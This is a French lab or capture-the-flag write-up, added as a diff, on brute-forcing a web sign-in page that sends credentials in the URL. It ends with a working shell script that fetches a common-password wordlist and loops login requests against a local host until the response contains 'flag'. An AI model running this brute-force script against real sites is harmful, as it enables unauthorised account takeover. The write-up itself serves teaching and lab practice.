@@ -1,0 +1,60 @@
+L'un des moyens les plus courant de pénétrer dans un site web, c'est le bruteforce.
+
+Si l'on se rend sur la page signin et qu'on essaie de se connecter avec par exemple avec :
+
+Id : 	qwerty
+pass : 	qwer
+
+On arrive sur un page qui nous dit sorry wrong answer, cependant si on regarde l'url on peut voir ces différents paramètres :
+
+clé		valeur
+
+page		signin
+username		qwerty
+password		qwer
+Login		Login
+
+On peut clairement voir dans l'URL ce qu'on a utilisé comme nom d'utilisateur et mot de passe. C'est clairement pas recommandé de faire ainsi car ça expose les informations d'identification de l'utilisateur en texte claire.
+
+Pour essayer de brutforce cette URL, il suffirait de changer la valeur du nom d'utilisateur et du mot de passe mais cela demanderait beaucoup trop de temps pour essayer tous les caractères comme nom d'utilisateur et mot de passe, une meilleure manière de procéder serait d'essayer la méthode du 'dictionnaire d'attaque'. Pour ceux qui ne le savent pas, cela correspond à une liste des mots de passe les plus couramment utilisés.
+
+Mais là encore cela prendrait trop de temps car le username et le password, en faisant quelques recherches on peut trouver une liste des noms d'utilisateur les plus utilisés.
+D'après ce site : https://lifehacker.com/the-top-10-usernames-and-passwords-hackers-try-to-get-i-1762638243 , parmi le top il y aurait 'Administrator', 'administrator' et 'admin'.
+On pourrait donc commencer par ceux là.
+
+Après quelques recherches de listes de password les plus utilisés je suis tombé sur un site qui en recense 1000, dans la vrai vie on prendrait surement une liste plus longue mais je me suis dis que ce serait déjà un bon début.
+
+https://github.com/DavidWittman/wpxmlrpcbrute/blob/master/wordlists/1000-most-common-passwords.txt
+
+Maintenant tout ce qu'il nous reste à faire c'est d'écrire un petit script qui va effectuer les requêtes avec les mots de passe qu'on va lui donner.
+
+Par exemple :
+
+_________________________________________
+
+#!/bin/sh
+
+HOST='192.168.1.5'
+USERNAME='admin'
+DICTIONARY=($(curl -s "https://raw.githubusercontent.com/DavidWittman/wpxmlrpcbrute/master/wordlists/1000-most-common-passwords.txt"))
+
+GREEN=$(tput setaf 2)
+RED=$(tput setaf 1)
+WHITE=$(tput setaf 7)
+
+declare -i V=0
+
+for i in ${DICTIONARY[@]};
+do
+    echo "${WHITE} - trying ${V} : ${i}"
+    V+=1
+    curl -s "http://$HOST/?page=signin&username=$USERNAME&password=${i}&Login=Login#" | grep flag
+    if [ $? -eq 0 ] # Si le status de sortie = 0
+    then
+        printf "\n"
+        echo "${GREEN}Found the password : ${i}"
+        exit
+    fi
+        printf "${RED}Pass not found"
+done
+_________________________________________
